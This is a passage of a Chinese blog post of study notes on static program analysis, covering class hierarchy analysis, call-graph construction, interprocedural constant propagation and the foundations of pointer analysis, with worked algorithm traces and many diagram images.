<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230106114548955.png" alt="image-20230106114548955"></p>
<p>需要遍历<code>c</code>的所有直接子类以及间接子类，通过<code>Dispatch</code>进行计算，将计算记过放入<code>T</code>中</p>

        <h4 id="实际例子"   >
          <a href="#实际例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230106114722837.png" alt="image-20230106114722837"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Resolve(c.foo()) = &#123;C.foo()&#125;</span><br><span class="line">Resolve(a.foo()) = &#123;A.foo(),C.foo(),D.foo()&#125;</span><br><span class="line">Resolve(b.foo()) = &#123;A.foo(),C.foo(),D.foo()&#125;</span><br></pre></td></tr></table></div></figure>

<p>关于<code>Resolve(b.foo())</code>计算结果，前面提到<code>dispatch</code>算法，当在当前类，这里也就是<code>B</code>中没有找到对应函数<code>foo</code>定义，就会去其父类寻找，这里也就是<code>A</code>，所以实际执行进入循环体的类为<code>A</code>，那么其结果就相当于<code>Resovle(a.foo())</code>了。</p>

        <h3 id="Features-of-CHA"   >
          <a href="#Features-of-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#Features-of-CHA" class="headerlink" title="Features of CHA"></a>Features of CHA</h3>
      
        <h4 id="Advantage"   >
          <a href="#Advantage" class="heading-link"><i class="fas fa-link"></i></a><a href="#Advantage" class="headerlink" title="Advantage"></a>Advantage</h4>
      <p>很快，只考虑声明类型，然后查找继承树。求解过程中忽略数据流和控制流的相关信息。</p>

        <h4 id="Disadvantage"   >
          <a href="#Disadvantage" class="heading-link"><i class="fas fa-link"></i></a><a href="#Disadvantage" class="headerlink" title="Disadvantage"></a>Disadvantage</h4>
      <p>不准确，因为忽略了数据流和控制流的相关信息</p>

        <h3 id="Algorithm-3"   >
          <a href="#Algorithm-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-3" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113100012796.png" alt="image-20230113100012796"></p>
<p>主要是从<code>Work list</code>中取方法后，需要先判断是否已经<code>reachable</code>了，即是否在<code>RM</code>中</p>

        <h4 id="例子-4"   >
          <a href="#例子-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-4" class="headerlink" title="例子"></a>例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113105835279.png" alt="image-20230113105835279"></p>
<ul>
<li><p>首先初始化如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110307953.png" alt="image-20230422110307953"></p>
</li>
<li><p><code>WL=[A.main()],RM=[],CG=[]</code></p>
<ul>
<li><p>从<code>WL</code>取出<code>A.main()</code>，不属于<code>RM</code>，则放入<code>RM</code>，<code>RM=[A.main()]</code></p>
</li>
<li><p><code>A.main</code>的<code>call site</code>为<code>A.foo()</code></p>
</li>
<li><p>求解<code>Resolve(A.foo())</code>，利用之前的提到的<code>Resolve</code>算法，求解得到<code>A.foo()</code>，放入<code>WL</code>中，并且相关边放入<code>CG</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110340228.png" alt="image-20230422110340228"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.foo()],RM=[A.main()],CG=[A.main().A.foo()-&gt;A.foo()]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo()]</code></p>
</li>
<li><p><code>Resolve(cs of A.foo()) = Resolve(a.bar()) = A.bar()+B.bar()+C.bar()</code>，<code>A.foo().a.bar()-&gt;[A.bar,B.bar,C.bar()]</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[A.bar(),B.bar(),C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110408853.png" alt="image-20230422110408853"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.bar(),B.bar(),C.bar()],RM=[A.main(),A.foo()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of A.bar()) = Resolve(c.bar()) = C.bar()</code>，<code>A.bar().c.bar()-&gt;C.bar()</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[B.bar(),C.bar(),C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110521314.png" alt="image-20230422110521314"></p>
</li>
</ul>
</li>
<li><p><code>WL=[B.bar(),C.bar(),C.bar()],RM=[A.main(),A.foo(),A.bar()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;,A.bar().c.bar()-&gt;C.bar()]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar(),B.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of B.bar()) = Resolve() = []</code></p>
</li>
<li><p><code>WL=[C.bar,C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110536692.png" alt="image-20230422110536692"></p>
</li>
</ul>
</li>
<li><p><code>WL=[C.bar(),C.bar()],RM=[A.main(),A.foo(),A.bar(),B.bar()],CG=[...]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of C.bar()) = Resolve(A.foo()) = A.foo()</code>，<code>C.bar().A.foo()-&gt;A.foo()</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[C.bar().A.foo()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110659618.png" alt="image-20230422110659618"></p>
</li>
</ul>
</li>
<li><p><code>WL=[C.bar(),A.foo()],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;,A.bar().c.bar()-&gt;C.bar(),C.bar().A.foo()-&gt;A.foo()]</code></p>
<ul>
<li><p><code>C.bar()</code>在<code>RM</code>中，跳过，从<code>WL</code>中移除<code>C.bar()</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110742581.png" alt="image-20230422110742581"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.foo()],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[...]</code></p>
<ul>
<li><p><code>A.foo()</code>在<code>RM</code>中，跳过，从<code>WL</code>中移除<code>A.foo()</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110813614.png" alt="image-20230422110813614"></p>
</li>
</ul>
</li>
<li><p><code>WL=[],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[...]</code></p>
<ul>
<li><p><code>WL</code>为空，算法结束。</p>
</li>
<li><p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110813614.png"></p>
</li>
</ul>
</li>
</ul>
<p>其中<code>CG</code>的表达形式不知道怎么写合适，就只能大概写一下</p>

        <h2 id="5-Interprocedural-Control-Flow-Graph"   >
          <a href="#5-Interprocedural-Control-Flow-Graph" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Interprocedural-Control-Flow-Graph" class="headerlink" title="5.Interprocedural Control-Flow Graph"></a>5.Interprocedural Control-Flow Graph</h2>
      <ul>
<li>CGF：展示的是方法之间的调用关系</li>
<li>ICFG：展示的是整个程序的调用关系<ul>
<li><code>ICFG = CFGs + call&amp;return edges</code><ul>
<li><code>call edges</code> : 即调用边，<code>call site</code>到对应函数入口点</li>
<li><code>return edges</code> : 即函数返回点到该函数的被调用点</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113450334.png" alt="image-20230113113450334"></p>

        <h2 id="6-Interprocedural-Data-Flow-Analysis"   >
          <a href="#6-Interprocedural-Data-Flow-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-Interprocedural-Data-Flow-Analysis" class="headerlink" title="6.Interprocedural Data-Flow Analysis"></a>6.Interprocedural Data-Flow Analysis</h2>
      <p>其实相对于<code>Intraprocedural Data-Flow Analysis</code>，会多<code>call transfer function</code>和<code>return transfer function</code>。即数据进入函数前的转化函数以及回来的时候的转化函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113110940851.png" alt="image-20230113110940851"></p>

        <h3 id="Interprocedural-Constant-Propagation"   >
          <a href="#Interprocedural-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h3>
      <p>主要是<code>Node transfer</code>，即如下情况，即为一个<code>Node transfer</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113112521557.png" alt="image-20230113112521557"></p>

        <h4 id="实例"   >
          <a href="#实例" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113112947040.png" alt="image-20230113112947040"></p>
<p>其中打问号的边叫做<code>call-to-return edge</code>，是用来传递本函数变量的，即该函数内部的变量，即这里的<code>a</code>，如果没有的话，就会导致本函数变量的传播经过调用函数绕一大圈才能回来。如下所示，本函数变量<code>a</code>就需要经过<code>addOne</code>传播才能回来，很影响效率。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113112058.png" alt="image-20230113113112058"></p>
<p>注意在传播过程的<code>Node transfer</code>时，需要<code>kill</code>掉返回覆盖的变量，比如这里就是<code>b</code>，这样在后面<code>call-to-return edge</code>和<code>return edge</code>进行<code>join</code>操作才会正确，如果不<code>kill</code>掉，就容易出现如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113906445.png" alt="image-20230113113906445"></p>
<p>没有<code>kill</code>掉时，即从<code>b=ten()</code>这条<code>call-to-return edge</code>流下来的<code>b</code>为7，而从<code>return edge</code>流出来的<code>b</code>为10，依据之前常量传播的<code>Control Flow</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ⊓p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>就会导致<code>b</code>的值为<code>NAC</code>，这是不准确的，其结果应该是被覆盖的那个值。</p>

        <h4 id="类比Intraprocedural-Constant-Propagation"   >
          <a href="#类比Intraprocedural-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#类比Intraprocedural-Constant-Propagation" class="headerlink" title="类比Intraprocedural Constant Propagation"></a>类比Intraprocedural Constant Propagation</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113124541680.png" alt="image-20230113124541680"></p>
<p>碰到函数调用就会产生<code>NAC</code>，不准确</p>

        <h2 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113124706083.png" alt="image-20230113124706083"></p>
<p>怎么通过类继承关系来创建调用图、过程间的控制流以及数据流分析的相关概念、过程间的常量分析</p>

        <h1 id="七、Pointer-Analysis"   >
          <a href="#七、Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、Pointer-Analysis" class="headerlink" title="七、Pointer Analysis"></a>七、Pointer Analysis</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105324445.png" alt="image-20230114105324445"></p>

        <h2 id="1-Motivation-1"   >
          <a href="#1-Motivation-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation-1" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p>在常规的<code>CHA</code>方法中，由于一个方法调用可能指向多个方法，那么在遍历这些方法的时候，返回的值都有可能不同，然后再做<code>join</code>操作时，就有可能出问题。</p>
<p>比如如下的<code>Constant Propagation </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113144912366.png" alt="image-20230113144912366"></p>
<p>由于声明的类型为<code>Number</code>，调用<code>get</code>时有三个子类，那么就会有三个方法需要进行遍历，最后进行<code>join</code>时就会导致<code>X=NAC</code>。但是实际上，其实只会调用到<code>One.get()</code>方法，只会返回1，导致<code>CHA</code>不准确，那么就用到<code>Pointer analysis</code>，更加准确</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113145316011.png" alt="image-20230113145316011"></p>

        <h2 id="2-Introduction-to-Pointer-Analysis"   >
          <a href="#2-Introduction-to-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Introduction-to-Pointer-Analysis" class="headerlink" title="2.Introduction to Pointer Analysis"></a>2.Introduction to Pointer Analysis</h2>
      <p>指针分析是属于<code>may-analysis</code>，有很多年历史，包括现今指针分析还有很多问题没有被完善解决，所以还是有很多这方面的研究应用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113145957855.png" alt="image-20230113145957855"></p>

        <h3 id="例子-5"   >
          <a href="#例子-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-5" class="headerlink" title="例子"></a>例子</h3>
      <p>相关的一些表达方式如下，指针分析即一个程序作为输入，通过分析之后，得到一个指向关系表。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113150547144.png" alt="image-20230113150547144"></p>

        <h3 id="应用"   >
          <a href="#应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#应用" class="headerlink" title="应用"></a>应用</h3>
      <p>应用很多，特别基础</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113150838229.png" alt="image-20230113150838229"></p>

        <h2 id="3-Key-Factors-of-Pointer-Analysis"   >
          <a href="#3-Key-Factors-of-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Key-Factors-of-Pointer-Analysis" class="headerlink" title="3.Key Factors of Pointer Analysis"></a>3.Key Factors of Pointer Analysis</h2>
      <p>指针分析中主要的一些讨论点，问题以及相关的处理方法，这些处理方法都有各自的优缺点，主要关注于分析的准确度<code>precision</code>以及效率<code>efficiency</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113151258381.png" alt="image-20230113151258381"></p>

        <h3 id="Heap-Abstraction"   >
          <a href="#Heap-Abstraction" class="heading-link"><i class="fas fa-link"></i></a><a href="#Heap-Abstraction" class="headerlink" title="Heap Abstraction"></a>Heap Abstraction</h3>
      <p>堆内存相信大家都很熟悉了，而在静态分析里面，由于堆是动态创建的，程序没有跑起来之前，不好确定程序究竟创建了多少个对象，而在有循环或者递归什么的时候，就更多了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152342466.png" alt="image-20230113152342466"></p>
<p>那么为了在静态分析中，确保分析过程能够停止下来，就不能在分析过程创建<code>infinite</code>个对象，就需要一种技术来对它进行抽象限制。</p>
<p>比较直观的一个例子就是把多个相同的对象都抽象成一个对象，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152349767.png" alt="image-20230113152349767"></p>
<p>相关的抽象技术也是很复杂，很多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152414219.png" alt="image-20230113152414219"></p>

        <h4 id="Allocation-Site-Abstraction"   >
          <a href="#Allocation-Site-Abstraction" class="heading-link"><i class="fas fa-link"></i></a><a href="#Allocation-Site-Abstraction" class="headerlink" title="Allocation-Site Abstraction"></a>Allocation-Site Abstraction</h4>
      <p>这个就是<code>Heap Abstraction</code>中一种技术，<code>Allocation-Site Abstraction</code>创建的抽象技术</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152536353.png" alt="image-20230113152536353"></p>
<p>比如这里的<code>O2</code>是代表程序中第二行创建对象语句，实际上由于循环有三次，所以会创建三个对象，但是基于<code>Alloction-Site Abstraction</code>，可以将这三个对象都抽象成一个对象<code>O2</code>。</p>
<p>由于一个程序中对象创建点肯定是有限的，那么抽象对象也肯定会是有限的，能够<code>terminate</code>。</p>

        <h3 id="Context-sentivity"   >
          <a href="#Context-sentivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-sentivity" class="headerlink" title="Context sentivity"></a>Context sentivity</h3>
      <p>一个方法被调用时依据传进来的参数不同，肯定也会对应不同的输出，所以针对同一个方法分析时，上下文敏感<code>Context sentivity</code>和上下文不敏感<code>Context insensitive</code>就是两种分析方法了，如下感觉图解很清楚。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113153450361.png" alt="image-20230113153450361"></p>
<p>会从<code>Context Insentivity</code>开始学习。对<code>JAVA</code>语言来说，<code>Context sentivity</code>提升是很明显的。</p>

        <h3 id="Flow-Insentivity"   >
          <a href="#Flow-Insentivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Flow-Insentivity" class="headerlink" title="Flow Insentivity"></a>Flow Insentivity</h3>
      <p>之前学习的基本都是<code>Flow Sentivity</code>，即会依照程序的执行顺序，一步一步进行分析。但是<code>Flow Insentivity</code>则不会，它相当于将之揉杂在一起，不管程序的执行顺序。相关例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113155136287.png" alt="image-20230113155136287"></p>
<ul>
<li><code>Flow Sentivity</code> : 每一条语句的指向关系<code>map</code>都会随着该语句的执行做出相应的改变，开销比较大，每一点都需要进行维护，速度会慢很多。</li>
<li><code>Flow Insentivity</code> : 相当于把一个变量的所有可能的指向关系<code>map</code>都会全部列出来，不管语句的相关执行顺序，会导致一些精度的缺失。</li>
</ul>
<p>对于<code>Java</code>而言，现今还没有相关的研究明显证明<code>Flow sentivity</code>比<code>Flow Insentivity</code>精度更好，所以现今大多都是针对<code>JAVA</code>的分析都是基于<code>Flow Insentivity</code> ，因为更简单更快。</p>
<p>但是对于<code>C</code>语言而言，<code>Flow sentivity</code>是会更好的。</p>

        <h3 id="Analysis-Scope"   >
          <a href="#Analysis-Scope" class="heading-link"><i class="fas fa-link"></i></a><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h3>
      <p>分析的范围，通常是两种，即<code>Whole-Program</code>全程序和<code>Demand-driven</code>需求驱动</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113160401076.png" alt="image-20230113160401076"></p>
<ul>
<li><code>Whole-Program</code> : 即整个程序所有变量的指向关系都会分析出来。更加简单全面，比较主流。</li>
<li><code>Demand-driven</code> : 即需要哪一部分就分析哪一部分，这里就好比需要分析<code>z.bar()</code>，那就只需要<code>z</code>的指向关系了。相比<code>Whole-Program</code>，有时候其效率其实也差不多，所以大多选择<code>Whole-Program</code>。</li>
</ul>

        <h2 id="4-Pointers-in-Java"   >
          <a href="#4-Pointers-in-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Pointers-in-Java" class="headerlink" title="4.Pointers in Java"></a>4.Pointers in Java</h2>
      
        <h3 id="关注的指针类型"   >
          <a href="#关注的指针类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#关注的指针类型" class="headerlink" title="关注的指针类型"></a>关注的指针类型</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114103432918.png" alt="image-20230114103432918"></p>
<p>基本只关注其中两种指针，即<code>local variable</code>，这个其实和<code>Static field</code>差不多。</p>
<p>另一个就是<code>Instance field</code>即类中的成员属性指针，这个和<code>Array element</code>基本归为一类，但是在处理的时候需要对<code>Array element</code>一些抽象，不关注其中的索引，而只关注其保存的指针，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114103639748.png" alt="image-20230114103639748"></p>
<p>将索引抽象成一个，因为在实际的程序中，索引很难判断出来，尤其在循环中，索引大多都是一些变量什么的，所以不好进行判断，那么就抽象成一个就好了。</p>

        <h3 id="关注的指针语句"   >
          <a href="#关注的指针语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#关注的指针语句" class="headerlink" title="关注的指针语句"></a>关注的指针语句</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104116410.png" alt="image-20230114104116410"></p>
<p>有两个需要特殊说明一下</p>
<ul>
<li><p><code>Store</code> : 有时候可能会有很复杂的语句，比如<code>x.f.g.h = y </code>，但是将之转换为三地址码，就比较简便了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104311457.png" alt="image-20230114104311457"></p>
</li>
<li><p><code>Call</code> : <code>JAVA</code>中存在三种类型的<code>Call</code>，但是我们关注于处理<code>Vitural call</code>的情况，这个比较复杂，这个会处理其他也会处理了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104435917.png" alt="aaa"></p>
</li>
</ul>

        <h2 id="总结-1"   >
          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104551016.png" alt="image-20230114104551016"></p>
<p>理解指针分析，影响指针分析的几种要素，以及在分析过程中需要处理分析的对象。</p>

        <h1 id="八、Pointer-Analysis-Foundations-I"   >
          <a href="#八、Pointer-Analysis-Foundations-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、Pointer-Analysis-Foundations-I" class="headerlink" title="八、Pointer Analysis Foundations (I)"></a>八、Pointer Analysis Foundations (I)</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105245754.png" alt="image-20230114105245754"></p>

        <h2 id="相关概念定义"   >
          <a href="#相关概念定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关概念定义" class="headerlink" title="相关概念定义"></a>相关概念定义</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105649355.png" alt="image-20230114105649355"></p>
<p><code>pt</code>就相当于一个<code>map</code>，<code>key-&gt;value</code>。<code>pt(p)</code>即变量<code>p</code>指向的对象的集合，比如<code>x = new T()</code>，则<code>pt(x)</code>就代表<code>x</code>指向的对象集合，因为我们用的是<code>Flow Insentivity</code>这个技术，所以是<code>pt(x)</code>是一个集合。</p>

        <h2 id="1-Rules"   >
          <a href="#1-Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Rules" class="headerlink" title="1.Rules"></a>1.Rules</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111049511.png" alt="image-20230114111049511"></p>
<p>即横线上面的为前提条件<code>premises</code>，当前提条件满足，则可以推导出结论<code>conclusion</code>。</p>

        <h3 id="Rule-New"   >
          <a href="#Rule-New" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-New" class="headerlink" title="Rule : New"></a>Rule : New</h3>
      <p>无条件得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111610469.png" alt="image-20230114111610469"></p>

        <h3 id="Rule-Assign"   >
          <a href="#Rule-Assign" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Assign" class="headerlink" title="Rule : Assign"></a>Rule : Assign</h3>
      <p>比如一条语句为<code>x=y</code>，如果<code>premises</code>满足<code>O𝑖 ∈ pt(y)</code>，那么即可推导出<code>conclusion</code>为<code>O𝑖 ∈ pt(x)</code>，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111313810.png" alt="image-20230114111313810"></p>
<p>即将<code>pt(y)</code>集合中的对象<code>Oi</code>加入到<code>pt(x)</code>这个集合中</p>

        <h3 id="Rule-Store"   >
          <a href="#Rule-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Store" class="headerlink" title="Rule : Store"></a>Rule : Store</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111644983.png" alt="image-20230114111644983"></p>
<p>需要理解一个<code>pt(Oi*f)</code>的含义，即某个<strong>对象成员</strong>指向的<strong>对象</strong>的合集。</p>

        <h3 id="Rule-Load"   >
          <a href="#Rule-Load" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Load" class="headerlink" title="Rule : Load"></a>Rule : Load</h3>
      <p>和前面差不多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114111859758.png" alt="image-20230114111859758"></p>

        <h3 id="总结-2"   >
          <a href="#总结-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114112036216.png" alt="image-20230114112036216"></p>
<p>其实就是形式化表达了这些语句，方便后续推导</p>

        <h2 id="2-How-to-Implement-Pointer-Analysis"   >
          <a href="#2-How-to-Implement-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-How-to-Implement-Pointer-Analysis" class="headerlink" title="2.How to Implement Pointer Analysis"></a>2.How to Implement Pointer Analysis</h2>
      <p>指针分析关键点就是如果在一个指针发生变化时，如何将变化传递给和该指针有关的其他指针。</p>
<p>使用图来传播指针，传输给该指针的后继。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114142437257.png" alt="image-20230114142437257"></p>

        <h3 id="Pointer-Flow-Graph-PFG"   >
          <a href="#Pointer-Flow-Graph-PFG" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Flow-Graph-PFG" class="headerlink" title="Pointer Flow Graph(PFG)"></a>Pointer Flow Graph(PFG)</h3>
      
        <h4 id="概念"   >
          <a href="#概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念" class="headerlink" title="概念"></a>概念</h4>
      <ul>
<li><p><code>Nodes</code></p>
<p><code>Pointer = V ⋃ (O × F)</code>，即节点<code>n</code>表示一个指针变量，或者说一个抽象对象的一个<code>field</code>。</p>
</li>
<li><p><code>Edges</code></p>
<p><code>Pointer × Pointer</code>，某条边<code>x-&gt;y</code>，代表<code>x</code>指向的对象<code>pt(x)</code>也**可能<code>may</code>**会流向<code>y</code>指向的对象<code>pt(y)</code>。</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114143412980.png" alt="image-20230114143412980"></p>
<p>节点<code>n</code>即相关的变量，边<code>edge</code>即流向关系。</p>

        <h4 id="实例-1"   >
          <a href="#实例-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4>
      <p>如下图所示，感觉还是挺清楚的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114144100365.png" alt="image-20230114144100365"></p>
<p>需要注意的是，<code>c.f</code>需要表示成<code>Oi.f</code>才行，才是一个真正的指针。</p>
<p>那么指针分析就变成在指针图<code>PFG</code>上分析指针集传播过程的问题了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114150729422.png" alt="image-20230114150729422"></p>

        <h3 id="Propagate-points-to-information-on-PFG"   >
          <a href="#Propagate-points-to-information-on-PFG" class="heading-link"><i class="fas fa-link"></i></a><a href="#Propagate-points-to-information-on-PFG" class="headerlink" title="Propagate points-to information on PFG"></a>Propagate points-to information on PFG</h3>
      <p>在上述建图的过程中，其实也涉及到指针传播的相关信息，并不是说在建立<code>PFG</code>时不考虑传播信息。比如说在构建<code>c.f=a</code>时，我们需要先知道的是<code>c</code>的指针流向，即<code>Oi</code>。传播和构建是相辅相成的，动态构建的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114152258172.png" alt="image-20230114152258172"></p>

        <h2 id="3-Pointer-Analysis-Algorithms"   >
          <a href="#3-Pointer-Analysis-Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Pointer-Analysis-Algorithms" class="headerlink" title="3.Pointer Analysis: Algorithms"></a>3.Pointer Analysis: Algorithms</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114153245606.png" alt="image-20230114153245606"></p>
<p>其中<code>S</code>即为输入程序语句的合集，<code>PFG</code>就是指针流向图，比较需要关注的就是<code>WL</code>以及其中的数据含义</p>
<ul>
<li><p><code>Worklist</code></p>
<p>存储需要被处理的<code>pair</code>，其中每个<code>pair</code>形式大概为<code>&lt;n,pts&gt;</code>，代表说<code>pts</code>这个对象集合需要被传播到指针<code>n</code>指向的对象集合<code>pt(n)</code>中。</p>
<p>比如一个<code>Worklist</code>为<code>[&lt;x,&#123;Oi&#125;&gt;,&lt;y,&#123;Oj,Ok&#125;&gt;,&lt;Oj.f,&#123;Ol&#125;...&gt;</code>，表示</p>
<ul>
